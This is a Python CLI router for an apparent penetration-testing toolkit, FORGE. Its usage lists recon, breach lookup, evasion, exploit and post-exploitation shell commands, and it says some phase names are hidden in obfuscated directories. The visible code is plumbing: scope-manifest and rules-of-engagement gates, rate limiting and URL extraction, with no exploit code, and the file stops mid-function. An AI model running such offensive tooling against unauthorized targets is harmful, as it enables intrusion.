"""
forge/cli.py — FORGE Toolkit CLI entrypoint.

Phase router via Typer sub-applications. Each phase registers its own
Typer app here; no phase-specific logic lives in this file.

Design constraints (PRD v7.2 §1.4):
  - Menu interaction latency < 1 s — imports are deferred to sub-commands.
  - Phases 2 and 5 binaries live in obfuscated directories; this router
    must never reveal canonical phase names in --help output.
  - FORGE_OFFLINE_STRICT=1 kills any attempted outbound call at the CLI
    boundary, not inside module code.

Usage:
    forge --help
    forge menu
    forge kb sync
    forge recon wizard --engagement <id>
    forge osint breach --engagement <id> --db <path>
    forge evasion generate --engagement <id>
    forge exploit correlate --engagement <id>
    forge post shell --engagement <id>
    forge report generate --engagement <id>
    forge clean --engagement <id>
"""

from __future__ import annotations

import ipaddress
import json
import csv
import html as html_lib
import logging
import os
import re
import signal
import sys
import sqlite3
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse
from pathlib import Path
from typing import Any, Callable, Iterable, Optional, Sequence, cast

logging.getLogger("httpx").setLevel(logging.WARNING)

import typer
from rich.console import Console

from forge import VERSION
from forge.config import ForgeConfig
from forge.utils.kill_chain_options import normalize_kill_chain_max_iter

console = Console(stderr=True)

_MOBILE_BUNDLE_SEED_SUFFIXES = (".apk", ".ipa", ".aab", ".apkm", ".apks", ".xapk")
_WEB_FETCH_DEFAULT_REQUEST_DELAY_SECONDS = 0.0
_IDENTITY_LOOKUP_DEFAULT_MAX_WORKERS = 1
_VALIDATION_DEFAULT_MAX_WORKERS = 1
_DNS_DEFAULT_MAX_WORKERS = 1
_PROVIDER_DEFAULT_MAX_WORKERS = 1
_PROVIDER_BATCH_STAGGER_DEFAULT_SECONDS = 0.0
_MODULE_SUBPROCESS_DEFAULT_TIMEOUT_SECONDS = 900.0
_MODULE_SUBPROCESS_TIMEOUT_EXIT_CODE = 124


def _cli_float_env(name: str, default: float, *, minimum: float, maximum: float) -> float:
    raw_value = os.environ.get(name, "").strip()
    if not raw_value:
        return default
    try:
        parsed = float(raw_value)
    except ValueError:
        return default
    return max(minimum, min(maximum, parsed))


def _cli_int_env(name: str, default: int, *, minimum: int, maximum: int) -> int:
    return int(
        _cli_float_env(
            name,
            float(default),
            minimum=float(minimum),
            maximum=float(maximum),
        )
    )


def _web_fetch_request_delay_seconds() -> float:
    return _cli_float_env(
        "FORGE_WEB_FETCH_REQUEST_DELAY_SECONDS",
        _WEB_FETCH_DEFAULT_REQUEST_DELAY_SECONDS,
        minimum=0.0,
        maximum=60.0,
    )


def _identity_lookup_max_workers() -> int:
    return _cli_int_env(
        "FORGE_IDENTITY_LOOKUP_MAX_WORKERS",
        _IDENTITY_LOOKUP_DEFAULT_MAX_WORKERS,
        minimum=1,
        maximum=4,
    )


def _validation_max_workers() -> int:
    return _cli_int_env(
        "FORGE_VALIDATION_MAX_WORKERS",
        _VALIDATION_DEFAULT_MAX_WORKERS,
        minimum=1,
        maximum=4,
    )


def _provider_max_workers(provider_name: str) -> int:
    normalized = re.sub(r"[^A-Z0-9]+", "_", str(provider_name or "").upper()).strip("_")
    if not normalized:
        return _PROVIDER_DEFAULT_MAX_WORKERS
    return _cli_int_env(
        f"FORGE_{normalized}_MAX_WORKERS",
        _PROVIDER_DEFAULT_MAX_WORKERS,
        minimum=1,
        maximum=4,
    )


def _normalized_provider_env_key(provider_name: str) -> str:
    return re.sub(r"[^A-Z0-9]+", "_", str(provider_name or "").upper()).strip("_")


def _provider_batch_stagger_seconds(provider_name: str) -> float:
    normalized = _normalized_provider_env_key(provider_name)
    global_default = _cli_float_env(
        "FORGE_PROVIDER_BATCH_STAGGER_SECONDS",
        _PROVIDER_BATCH_STAGGER_DEFAULT_SECONDS,
        minimum=0.0,
        maximum=60.0,
    )
    if not normalized:
        return global_default
    return _cli_float_env(
        f"FORGE_{normalized}_BATCH_STAGGER_SECONDS",
        global_default,
        minimum=0.0,
        maximum=60.0,
    )


def _module_subprocess_timeout_seconds() -> float:
    return _cli_float_env(
        "FORGE_MODULE_SUBPROCESS_TIMEOUT_SECONDS",
        _MODULE_SUBPROCESS_DEFAULT_TIMEOUT_SECONDS,
        minimum=1.0,
        maximum=86400.0,
    )


def _timeout_stream_text(value: object) -> str:
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return str(value or "")


def _run_forge_module_subprocess(
    cmd_argv: Sequence[str],
    *,
    tor_prefix: Sequence[str] = (),
    timeout_seconds: float | None = None,
) -> subprocess.CompletedProcess[str]:
    args = [sys.executable, "-m", "forge.cli", *tor_prefix, *cmd_argv]
    timeout = (
        _module_subprocess_timeout_seconds()
        if timeout_seconds is None
        else max(1.0, float(timeout_seconds))
    )
    try:
        return subprocess.run(
            args,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
    except subprocess.TimeoutExpired as exc:
        stderr_tail = _timeout_stream_text(exc.stderr)[-512:]
        timeout_message = f"timeout after {timeout:g}s"
        if stderr_tail:
            timeout_message = f"{timeout_message}; {stderr_tail}"
        return subprocess.CompletedProcess(
            args,
            _MODULE_SUBPROCESS_TIMEOUT_EXIT_CODE,
            _timeout_stream_text(exc.stdout),
            timeout_message,
        )


def _append_cli_option_once(argv: list[str], flag: str, value: str) -> list[str]:
    if not value or flag in argv:
        return argv
    return [*argv, flag, value]


def _append_cli_flag_once(argv: list[str], flag: str) -> list[str]:
    if flag in argv:
        return argv
    return [*argv, flag]


def _detected_prereq_child_argv(
    argv: Sequence[str],
    *,
    roe_id: str = "",
    scope_manifest: str = "",
) -> list[str]:
    hardened = [str(item) for item in argv]
    if len(hardened) < 2:
        return hardened
    group, command = hardened[0], hardened[1]
    if group == "cloud" and command in {"aws", "azure", "firebase", "supabase"}:
        hardened = _append_cli_option_once(hardened, "--roe-id", roe_id)
    if group == "cloud" and command in {"aws", "azure"}:
        hardened = _append_cli_flag_once(hardened, "--yes")
    if group == "cloud" and command in {"firebase", "firebase-extract", "supabase"}:
        hardened = _append_cli_option_once(hardened, "--scope-manifest", scope_manifest)
    return hardened


def _module_provider_key(spec: ModuleDispatchSpec) -> str | None:
    argv = [str(item).strip().lower() for item in spec.cmd_argv if str(item).strip()]
    if len(argv) < 2:
        return None
    group, command = argv[0], argv[1]
    if group == "osint" and command in {"shodan", "urlscan"}:
        return command
    if group == "recon" and command == "subdomains":
        return "crtsh"
    if group == "recon" and command == "crawl":
        return "web_fetch"
    if group == "vuln" and command == "passive":
        return "web_fetch"
    if group == "osint" and command in {
        "emailrep",
        "google",
        "gravatar",
        "instagram",
        "name",
        "phone",
        "sherlock",
    }:
        return "identity_lookup"
    return None


def _provider_limited_worker_count(
    specs: Sequence[ModuleDispatchSpec],
    requested_workers: int,
) -> int:
    bounded = max(1, int(requested_workers or 1))
    provider_keys = [key for spec in specs if (key := _module_provider_key(spec))]
    if not provider_keys:
        return bounded
    return min(bounded, *(_provider_max_workers(key) for key in provider_keys))


def _provider_launch_delays(specs: Sequence[ModuleDispatchSpec]) -> list[float]:
    seen_by_provider: dict[str, int] = {}
    delays: list[float] = []
    for spec in specs:
        provider_key = _module_provider_key(spec)
        if not provider_key:
            delays.append(0.0)
            continue
        seen_index = seen_by_provider.get(provider_key, 0)
        seen_by_provider[provider_key] = seen_index + 1
        stagger_seconds = _provider_batch_stagger_seconds(provider_key)
        delays.append(max(0.0, stagger_seconds * seen_index))
    return delays


def _sleep_provider_launch_delay(delay_seconds: float) -> None:
    if delay_seconds > 0:
        time.sleep(delay_seconds)


def _passive_archive_lookup_max_workers(requested_workers: int) -> int:
    return min(
        max(1, int(requested_workers or 1)),
        _provider_max_workers("wayback"),
        _provider_max_workers("commoncrawl"),
    )


def _is_mobile_bundle_url(value: str) -> bool:
    text = str(value or "").strip()
    if not text:
        return False
    parsed = urlparse(text)
    return (
        parsed.scheme in {"http", "https"}
        and bool(parsed.netloc)
        and parsed.path.lower().endswith(_MOBILE_BUNDLE_SEED_SUFFIXES)
    )


@dataclass(frozen=True)
class ModuleDispatchSpec:
    cmd_argv: list[str]
    label: str
    loop_name: str | None = None
    seed_contexts: list[dict[str, object]] | None = None
    metadata: dict[str, object] | None = None


@dataclass(frozen=True)
class HtmlFetchSpec:
    url: str
    use_playwright: bool = True
    playwright_timeout: float = 15.0
    fallback_timeout: float = 8.0


def _scope_manifest_values(data: dict[str, Any], *keys: str) -> list[str]:
    values: list[str] = []
    seen: set[str] = set()
    for key in keys:
        raw_value = data.get(key)
        if raw_value is None:
            continue
        raw_items = raw_value if isinstance(raw_value, list) else [raw_value]
        for item in raw_items:
            value = " ".join(str(item or "").strip().split())
            if value and value not in seen:
                seen.add(value)
                values.append(value)
    return values


def _load_scope_manifest(value: str) -> dict[str, Any]:
    manifest_ref = str(value or "").strip()
    if not manifest_ref:
        raise ValueError("scope manifest path or JSON payload is required")
    if manifest_ref.startswith("{"):
        source = "inline_json"
        payload = json.loads(manifest_ref)
    else:
        path = Path(manifest_ref).expanduser()
        source = path.resolve().as_posix()
        payload = json.loads(path.read_text(encoding="utf-8"))
    if not isinstance(payload, dict):
        raise ValueError("scope manifest must decode to a JSON object")

    domains = _scope_manifest_values(payload, "domains", "domain_allowlist")
    ip_ranges = _scope_manifest_values(payload, "ip_ranges", "cidrs", "cidr_ranges")
    urls = _scope_manifest_values(payload, "urls", "url_prefixes")
    exact_seeds = _scope_manifest_values(
        payload,
        "seeds",
        "authorized_seeds",
        "allowed_seeds",
        "targets",
        "allowed_targets",
    )
    roe_id = " ".join(str(payload.get("roe_id") or payload.get("roe") or "").strip().split())
    return {
        "source": source,
        "roe_id": roe_id[:160],
        "domains": domains,
        "ip_ranges": ip_ranges,
        "urls": urls,
        "exact_seeds": exact_seeds,
        "raw": payload,
    }


def _scope_manifest_seed_targets(seed_value: str, seed_type: str) -> list[str]:
    value = str(seed_value or "").strip()
    kind = str(seed_type or "").strip().lower()
    targets: list[str] = []

    def _append(target: str) -> None:
        normalized = str(target or "").strip()
        if normalized and normalized not in targets:
            targets.append(normalized)

    if kind in {"url", "apk_url"}:
        _append(value)
        parsed = urlparse(value)
        _append(str(parsed.hostname or "").strip().lower().strip("."))
    elif kind == "email" and "@" in value:
        _append(value.rsplit("@", 1)[1].strip().lower().strip("."))
    elif kind in {"domain", "subdomain", "ipv4", "ipv6"}:
        _append(value.lower().strip("."))
    else:
        _append(value)
    return targets


def _validate_scope_manifest_seed_values(
    manifest: dict[str, Any],
    seed_entries: Iterable[dict[str, str]],
) -> dict[str, Any]:
    from forge.governance.scope_gate import EngagementScope, ScopeGate  # noqa: PLC0415

    exact_seeds = {
        str(value or "").strip().casefold()
        for value in manifest.get("exact_seeds", [])
        if str(value or "").strip()
    }
    gate = ScopeGate(
        EngagementScope(
            domains=list(manifest.get("domains") or []),
            ip_ranges=list(manifest.get("ip_ranges") or []),
            urls=list(manifest.get("urls") or []),
        )
    )
    authorized: list[dict[str, str]] = []
    denied: list[dict[str, str]] = []
    for entry in seed_entries:
        seed_value = str(entry.get("value") or "").strip()
        seed_type = str(entry.get("seed_type") or "").strip().lower()
        if not seed_value:
            continue
        if seed_value.casefold() in exact_seeds:
            authorized.append(
                {
                    "seed_value": seed_value,
                    "seed_type": seed_type,
                    "matched": seed_value,
                    "match_type": "exact_seed",
                }
            )
            continue
        candidate_targets = _scope_manifest_seed_targets(seed_value, seed_type)
        if seed_type in {"url", "apk_url"} and list(manifest.get("urls") or []):
            candidate_targets = [seed_value]
        matched_target = ""
        for target in candidate_targets:
            if gate.is_in_scope(target):
                matched_target = target
                break
        if matched_target:
            authorized.append(
                {
                    "seed_value": seed_value,
                    "seed_type": seed_type,
                    "matched": matched_target,
                    "match_type": "scope_gate",
                }
            )
        else:
            denied.append({"seed_value": seed_value, "seed_type": seed_type})
    return {"authorized": authorized, "denied": denied}


def _direct_cli_scope_manifest_value(scope_manifest: str | None) -> str:
    explicit_value = str(scope_manifest or "").strip()
    if explicit_value:
        return explicit_value
    return str(os.environ.get("FORGE_SCOPE_MANIFEST", "") or "").strip()


def _direct_cli_require_scope_manifest() -> bool:
    return str(os.environ.get("FORGE_REQUIRE_SCOPE_MANIFEST", "")).strip().lower() in {
        "1",
        "true",
        "yes",
        "on",
    }


def _direct_cli_split_scope_entries(entries: Iterable[str]) -> tuple[list[str], list[str]]:
    scope_values: list[str] = []
    url_prefixes: list[str] = []
    for entry in entries:
        text = str(entry or "").strip()
        if not text:
            continue
        if text.startswith(("http://", "https://")):
            url_prefixes.append(text)
            host = urlparse(text).hostname
            if host:
                scope_values.append(host)
            continue
        scope_values.append(text)
    return list(dict.fromkeys(scope_values)), list(dict.fromkeys(url_prefixes))


def _direct_cli_load_scope_lists(
    *,
    engagement_id: int,
    db_path: Path,
    scope_manifest: str | None = None,
    target: str | None = None,
    seed_type: str = "url",
) -> tuple[list[str], list[str]]:
    manifest_ref = _direct_cli_scope_manifest_value(scope_manifest)
    if manifest_ref:
        manifest = _load_scope_manifest(manifest_ref)
        if target:
            validation = _validate_scope_manifest_seed_values(
                manifest,
                [{"value": target, "seed_type": seed_type}],
            )
            if not list(validation.get("authorized") or []):
                source = str(manifest.get("source") or "")
                raise typer.BadParameter(
                    f"target is outside scope manifest: target={target!r} source={source!r}"
                )
        return (
            [
                str(item)
                for item in [
                    *list(manifest.get("domains") or []),
                    *list(manifest.get("ip_ranges") or []),
                ]
                if str(item or "").strip()
            ],
            [str(item) for item in list(manifest.get("urls") or []) if str(item or "").strip()],
        )

    if _direct_cli_require_scope_manifest():
        raise typer.BadParameter(
            "FORGE_REQUIRE_SCOPE_MANIFEST=1 requires --scope-manifest or FORGE_SCOPE_MANIFEST."
        )

    from forge.opsec.scope_gate import load_scope_from_db  # noqa: PLC0415

    scope, url_prefixes = _direct_cli_split_scope_entries(
        str(item) for item in load_scope_from_db(str(db_path), engagement_id)
    )
    if target and not scope and not url_prefixes:
        raise typer.BadParameter(
            f"engagement {engagement_id} has no scope_json; refusing direct live target {target!r}."
        )
    if target:
        if url_prefixes:
            from forge.governance.scope_gate import EngagementScope, ScopeGate  # noqa: PLC0415

            domains: list[str] = []
            ip_ranges: list[str] = []
            for item in scope:
                if "/" in item and "://" not in item:
                    ip_ranges.append(item)
                else:
                    domains.append(item)
            if not ScopeGate(EngagementScope(domains=domains, ip_ranges=ip_ranges, urls=url_prefixes)).is_in_scope(target):
                raise typer.BadParameter(f"target is outside scope: target={target!r}")
        else:
            from forge.opsec.scope_gate import ScopeViolationError, assert_in_scope  # noqa: PLC0415

            try:
                assert_in_scope(target, scope)
            except ScopeViolationError as exc:
                raise typer.BadParameter(f"target is outside scope: target={target!r}") from exc
    return scope, url_prefixes


def _direct_cli_require_roe(roe_id: str | None, *, command_name: str) -> str:
    normalized = " ".join(str(roe_id or os.environ.get("FORGE_ROE_ID", "") or "").strip().split())[:160]
    if not normalized:
        raise typer.BadParameter(
            f"{command_name} requires --roe-id or FORGE_ROE_ID before live execution."
        )
    return normalized


_PASSIVE_TEXT_URL_RE = re.compile(r"https?://[^\s\"'<>`]+", re.IGNORECASE)
_PASSIVE_WEB_DIRECTIVES = {"allow", "disallow", "sitemap"}
_HTML_PHONE_RE = re.compile(r"(?<![\w+])(\+\d[\d().\-\s]{5,}\d)(?!\w)")
_HTML_ATTRIBUTE_URL_RE = re.compile(
    r"""(?:href|src|action|formaction|poster|data|data-(?:src|href|url|original|lazy-src|background|bg))\s*=\s*["']([^"'#][^"']*)["']""",
    re.IGNORECASE,
)
_HTML_TAG_ATTRIBUTE_RE = re.compile(
    r"""([A-Za-z_:][-A-Za-z0-9_:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))""",
    re.IGNORECASE,
)
_HTML_META_TAG_RE = re.compile(r"""<meta\b[^>]*>""", re.IGNORECASE)
_HTML_META_REFRESH_URL_RE = re.compile(r"""(?:^|;)\s*url\s*=\s*([^;]+)""", re.IGNORECASE)
_HTML_SRCSET_ATTRIBUTE_RE = re.compile(
    r"""srcset\s*=\s*["']([^"']*)["']""",
    re.IGNORECASE,
)
_HTML_CSS_URL_RE = re.compile(
    r"""url\(\s*["']?([^"')\s#][^"')]*)["']?\s*\)""",
    re.IGNORECASE,
)
_HTML_CSS_IMPORT_RE = re.compile(
    r"""@import\s+(?:url\(\s*)?["']?([^"')\s;#][^"');]*)["']?\s*\)?""",
    re.IGNORECASE,
)
_HTML_JS_CALL_URL_RE = re.compile(
    r"""\b(?:fetch|import|importScripts|sendBeacon)\s*\(\s*["']([^"'#][^"']*)["']""",
    re.IGNORECASE,
)
_HTML_JS_CONSTRUCTOR_URL_RE = re.compile(
    r"""\bnew\s+(?:EventSource|SharedWorker|Worker|WebSocket)\s*\(\s*["']([^"'#][^"']*)["']""",
    re.IGNORECASE,
)
_HTML_JS_METHOD_CALL_URL_RE = re.compile(
    r"""\b(?:api|axios|client|http|request)\s*\.\s*(?:delete|get|head|options|patch|post|put|request)\s*\(\s*["']([^"'#][^"']*)["']""",
    re.IGNORECASE,
)
_HTML_IGNORED_URL_PREFIXES = ("mailto:", "tel:", "javascript:", "data:")
_HTML_MINED_KEYS = (
    "emails",
    "phones",
    "ip_seeds",
    "github_orgs",
    "subdomain_hints",
    "public_profile_urls",
    "crawl_urls",
)


def _empty_html_mined_result() -> dict[str, set[str]]:
    return {key: set() for key in _HTML_MINED_KEYS}


def _merge_html_mined_result(
    target: dict[str, set[str]],
    parsed_result: dict[str, Any],
) -> None:
    for key in _HTML_MINED_KEYS:
        raw_values = parsed_result.get(key) or set()
        if isinstance(raw_values, str):
            normalized_value = raw_values.strip()
            if normalized_value:
                target[key].add(normalized_value)
            continue
        try:
            values = list(raw_values)
        except TypeError:
            continue
        for value in values:
            normalized_value = str(value or "").strip()
            if normalized_value:
                target[key].add(normalized_value)


def _batch_progress_snapshot(
    *,
    total: int,
    workers: int,
    completed: int,
    failed: int,
    started_at: float,
) -> dict[str, object]:
    total_items = max(0, int(total or 0))
    active_workers = max(1, int(workers or 1)) if total_items else 0
    finished = max(0, min(total_items, int(completed or 0)))
    failed_items = max(0, min(finished, int(failed or 0)))
    remaining = max(0, total_items - finished)
    running = 0 if remaining <= 0 else min(active_workers, remaining)
    pending = max(0, remaining - running)
    payload: dict[str, object] = {
        "total": total_items,
        "workers": active_workers,
        "running": running,
        "pending": pending,
        "queue_depth": pending,
        "completed": finished,
        "failed": failed_items,
        "eta_seconds": None,
    }
    if total_items and remaining <= 0:
        payload["eta_seconds"] = 0.0
    elif total_items and finished > 0:
        elapsed = max(0.0, time.perf_counter() - started_at)
        if elapsed > 0:
            payload["eta_seconds"] = round((elapsed / finished) * remaining, 1)
    return payload


def _run_module_batch(
    specs: list[ModuleDispatchSpec],
    run_module: Callable[..., int],
    *,
    max_workers: int,
    progress_label: str | None = None,
    progress_callback: Callable[[str, dict[str, object]], None] | None = None,
) -> list[int]:
    if not specs:
        return []
    bounded_workers = max(
        1,
        min(
            _provider_limited_worker_count(specs, int(max_workers or 1)),
            len(specs),
        ),
    )
    started_at = time.perf_counter()
    launch_delays = _provider_launch_delays(specs)

    def _emit_progress(completed: int, failed: int) -> None:
        if progress_callback is None or not progress_label:
            return
        progress_callback(
            progress_label,
            _batch_progress_snapshot(
                total=len(specs),
                workers=bounded_workers,
                completed=completed,
                failed=failed,
                started_at=started_at,
            ),
        )

    _emit_progress(0, 0)
    if bounded_workers == 1:
        results: list[int] = []
        failed = 0
        for index, spec in enumerate(specs, start=1):
            _sleep_provider_launch_delay(launch_delays[index - 1])
            result = int(
                run_module(
                    spec.cmd_argv,
                    spec.label,
                    loop_name=spec.loop_name,
                    seed_contexts=spec.seed_contexts,
                    metadata=spec.metadata,
                )
            )
            results.append(result)
            if result != 0:
                failed += 1
            _emit_progress(index, failed)
        return results
    results = [0] * len(specs)
    completed = 0
    failed = 0

    def _run_delayed_module(index_and_spec: tuple[int, ModuleDispatchSpec]) -> int:
        index, spec = index_and_spec
        _sleep_provider_launch_delay(launch_delays[index])
        return int(
            run_module(
                spec.cmd_argv,
                spec.label,
                loop_name=spec.loop_name,
                seed_contexts=spec.seed_contexts,
                metadata=spec.metadata,
            )
        )

    with ThreadPoolExecutor(max_workers=bounded_workers) as executor:
        future_map = {
            executor.submit(
                _run_delayed_module,
                (index, spec),
            ): index
            for index, spec in enumerate(specs)
        }
        for future in as_completed(future_map):
            try:
                result = int(future.result())
            except Exception:
                completed += 1
                failed += 1
                _emit_progress(completed, failed)
                raise
            results[future_map[future]] = result
            completed += 1
            if result != 0:
                failed += 1
            _emit_progress(completed, failed)
    return results


def _run_callable_batch(
    items: list[Any],
    worker: Callable[[Any], Any],
    *,
    max_workers: int,
    progress_label: str | None = None,
    progress_callback: Callable[[str, dict[str, object]], None] | None = None,
) -> list[Any]:
    return _run_inprocess_batch(
        items,
        worker,
        max_workers=max_workers,
        progress_label=progress_label,
        progress_callback=progress_callback,
    )


def _run_inprocess_batch(
    items: list[Any],
    worker: Callable[[Any], Any],
    *,
    max_workers: int,
    progress_label: str | None = None,
    progress_callback: Callable[[str, dict[str, object]], None] | None = None,
) -> list[Any]:
    if not items:
        return []
    bounded_workers = max(1, min(int(max_workers or 1), len(items)))
    started_at = time.perf_counter()

    def _emit_progress(completed: int, failed: int) -> None:
        if progress_callback is None or not progress_label:
            return
        progress_callback(
            progress_label,
            _batch_progress_snapshot(
                total=len(items),
                workers=bounded_workers,
                completed=completed,
                failed=failed,
                started_at=started_at,
            ),
        )

    _emit_progress(0, 0)
    if bounded_workers == 1:
        results: list[Any] = []
        for index, item in enumerate(items, start=1):
            results.append(worker(item))
            _emit_progress(index, 0)
        return results
    results: list[Any] = [None] * len(items)
    completed = 0
    failed = 0
    with ThreadPoolExecutor(max_workers=bounded_workers) as executor:
        future_map = {
            executor.submit(worker, item): index
            for index, item in enumerate(items)
        }
        for future in as_completed(future_map):
            try:
                result = future.result()
            except Exception:
                completed += 1
                failed += 1
                _emit_progress(completed, failed)
                raise
            results[future_map[future]] = result
            completed += 1
            _emit_progress(completed, failed)
    return results


def _run_html_fetch_batch(
    specs: list[HtmlFetchSpec],
    fetch_playwright: Callable[[str, float], str],
    fetch_target_html: Callable[[str, float], str],
    *,
    max_workers: int,
    progress_label: str | None = None,
    progress_callback: Callable[[str, dict[str, object]], None] | None = None,
) -> list[str]:
    if not specs:
        return []

    def _worker(spec: HtmlFetchSpec) -> str:
        try:
            from forge.utils.intel.http_pacing import sleep_rate_limit_cooldown  # noqa: PLC0415

            sleep_rate_limit_cooldown("web_fetch", spec.url)
        except Exception:  # noqa: BLE001
            pass
        request_delay = _web_fetch_request_delay_seconds()
        if request_delay > 0:
            time.sleep(request_delay)
        html = ""
        if spec.use_playwright:
            html = fetch_playwright(spec.url, spec.playwright_timeout)
        if not html:
            html = fetch_target_html(spec.url, spec.fallback_timeout)
        return html or ""

    return [
        str(item or "")
        for item in _run_callable_batch(
            specs,
            _worker,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
    ]


def _run_ptr_lookup_batch(
    ips: list[str],
    gethostbyaddr: Callable[[str], tuple[str, object, object]],
    *,
    max_workers: int,
    progress_label: str | None = None,
    progress_callback: Callable[[str, dict[str, object]], None] | None = None,
) -> list[tuple[str, str]]:
    if not ips:
        return []

    def _worker(ip: str) -> tuple[str, str]:
        try:
            hostname, _aliases, _addresses = gethostbyaddr(ip)
        except OSError:
            return ip, ""
        return ip, str(hostname or "").strip().lower()

    return [
        (str(ip or ""), str(hostname or ""))
        for ip, hostname in _run_callable_batch(
            ips,
            _worker,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
    ]


def _normalize_discovered_url(value: str) -> str:
    candidate = str(value or "").strip()
    if not candidate:
        return ""
    candidate = candidate.strip("[]{}()<>'\"")
    while candidate and candidate[-1] in {".", ",", ";"}:
        candidate = candidate[:-1]
    parsed = urlparse(candidate)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        return ""
    return candidate


def _extract_passive_text_urls(text: str, *, base_url: str = "") -> list[str]:
    """Extract absolute URLs from passive text like robots/sitemap payloads.

    Besides literal absolute URLs, this also expands robots-style
    ``Allow:``, ``Disallow:``, and ``Sitemap:`` directives into absolute
    in-scope URLs when a base URL is available.
    """

    ordered_urls: list[str] = []
    seen: set[str] = set()

    def _append(candidate: str) -> None:
        normalized = _normalize_discovered_url(candidate)
        if not normalized or normalized in seen:
            return
        seen.add(normalized)
        ordered_urls.append(normalized)

    raw_text = str(text or "")
    for match in _PASSIVE_TEXT_URL_RE.finditer(raw_text):
        _append(match.group(0))

    parsed_base = urlparse(str(base_url or "").strip())
    if parsed_base.scheme in {"http", "https"} and parsed_base.netloc:
        for raw_line in raw_text.splitlines():
            line = raw_line.strip()
            if not line or line.startswith("#") or ":" not in line:
                continue
            directive, raw_value = line.split(":", 1)
            if directive.strip().lower() not in _PASSIVE_WEB_DIRECTIVES:
                continue
            value = raw_value.strip()
            if not value or value == "/":
                continue
            if value.startswith(("http://", "https://")):
                _append(value)
                continue
            if value.startswith("/"):
                _append(urljoin(base_url, value))

    return ordered_urls


def _extract_html_surface_urls(html: str, *, base_url: str = "") -> list[str]:
    """Extract absolute and relative HTML-linked URLs from a rendered surface."""

    ordered_urls: list[str] = []
    seen: set[str] = set()

    def _append(candidate: str) -> None:
        normalized = _normalize_discovered_url(candidate)
        if not normalized or normalized in seen:
            return
        seen.add(normalized)
        ordered_urls.append(normalized)

    raw_html = str(html or "")
    for match in _PASSIVE_TEXT_URL_RE.finditer(raw_html):
        _append(match.group(0))

    def _resolve_surface_candidate(raw_value: str) -> str:
        value = html_lib.unescape(str(raw_value or "").strip())
        if not value or value.lower().startswith(_HTML_IGNORED_URL_PREFIXES):
            return ""
        return urljoin(base_url, value)

    parsed_base = urlparse(str(base_url or "").strip())
    if parsed_base.scheme in {"http", "https"} and parsed_base.netloc:
        for match in _HTML_ATTRIBUTE_URL_RE.finditer(raw_html):
            resolved = _resolve_surface_candidate(str(match.group(1) or ""))
            if not resolved:
                continue
            _append(resolved)
        for meta_match in _HTML_META_TAG_RE.finditer(raw_html):
            attrs: dict[str, str] = {}
            for attr_match in _HTML_TAG_ATTRIBUTE_RE.finditer(meta_match.group(0)):
                attr_name = str(attr_match.group(1) or "").strip().lower()
                attr_value = next(
                    (
                        str(group or "")
                        for group in attr_match.groups()[1:]
                        if group is not None
                    ),
                    "",
                )
                attrs[attr_name] = html_lib.unescape(attr_value.strip())
            if attrs.get("http-equiv", "").strip().lower() != "refresh":
                continue
            refresh_match = _HTML_META_REFRESH_URL_RE.search(attrs.get("content", ""))
            if not refresh_match:
                continue
            raw_value = html_lib.unescape(
                str(refresh_match.group(1) or "").strip().strip("'\"")
            )
            resolved = _resolve_surface_candidate(raw_value)
            if not resolved:
                continue
            _append(resolved)
        for match in _HTML_SRCSET_ATTRIBUTE_RE.finditer(raw_html):
            srcset_value = html_lib.unescape(str(match.group(1) or ""))
            skip_data_payload = False
            for candidate in srcset_value.split(","):
                raw_value = candidate.strip().split(maxsplit=1)[0] if candidate.strip() else ""
                if skip_data_payload:
                    skip_data_payload = False
                    continue
                if not raw_value or raw_value.lower().startswith(_HTML_IGNORED_URL_PREFIXES):
                    if raw_value.lower().startswith("data:"):
                        skip_data_payload = True
                    continue
                _append(urljoin(base_url, raw_value))
        for match in _HTML_CSS_URL_RE.finditer(raw_html):
            resolved = _resolve_surface_candidate(str(match.group(1) or ""))
            if not resolved:
                continue
            _append(resolved)
        for match in _HTML_CSS_IMPORT_RE.finditer(raw_html):
            resolved = _resolve_surface_candidate(str(match.group(1) or ""))
            if not resolved:
                continue
            _append(resolved)
        for pattern in (
            _HTML_JS_CALL_URL_RE,
            _HTML_JS_CONSTRUCTOR_URL_RE,
            _HTML_JS_METHOD_CALL_URL_RE,
        ):
            for match in pattern.finditer(raw_html):
                resolved = _resolve_surface_candidate(str(match.group(1) or ""))
                if not resolved:
                    continue
                _append(resolved)

    return ordered_urls


def _normalise_output_format(value: str) -> str:
    fmt = value.strip().lower()
    if fmt not in {"json", "csv", "sarif"}:
        raise typer.BadParameter("output format must be one of: json, csv, sarif")
    return fmt


def _render_sarif(provider: str, findings: list[dict]) -> dict:
    return {
        "version": "2.1.0",
        "runs": [
            {
                "tool": {
                    "driver": {
                        "name": "FORGE Cloud Audit",
                        "informationUri": "https://github.com/",
                        "rules": [],
                    }
                },
                "results": [
                    {
                        "ruleId": item.get("finding_type", "CLOUD_MISCONFIG"),
                        "level": item.get("severity", "medium").lower(),
                        "message": {"text": item.get("title", "")},
                        "properties": {
                            "provider": provider,
                            "resource_id": item.get("resource_id", ""),
                            "resource_type": item.get("resource_type", ""),
                            "service": item.get("service", ""),
                            "compliance_controls": item.get("compliance_controls", []),
                        },
                    }
                    for item in findings
                ],
            }
        ],
    }


def _write_cloud_output(
    findings: list[dict],
    provider: str,
    output_format: str,
    output_path: Path,
) -> None:
    output_path.parent.mkdir(parents=True, exist_ok=True)
    if output_format == "json":
        output_path.write_text(json.dumps(findings, indent=2), encoding="utf-8")
        return
    if output_format == "csv":
        columns = [
            "service",
            "resource_type",
            "resource_id",
            "finding_type",
            "severity",
            "title",
            "description",
            "remediation",
        ]
        with output_path.open("w", encoding="utf-8", newline="") as handle:
            writer = csv.DictWriter(handle, fieldnames=columns)
            writer.writeheader()
            for item in findings:
                writer.writerow({col: item.get(col, "") for col in columns})
        return
    sarif_doc = _render_sarif(provider=provider, findings=findings)
    output_path.write_text(json.dumps(sarif_doc, indent=2), encoding="utf-8")


def _cli_audit(
    db_path: Path,
    engagement_id: int,
    phase: str,
    module: str,
    action: str,
    target: Optional[str] = None,
    result: Optional[str] = None,
) -> None:
    """Append one row to engagement.audit_log; silent on failure.

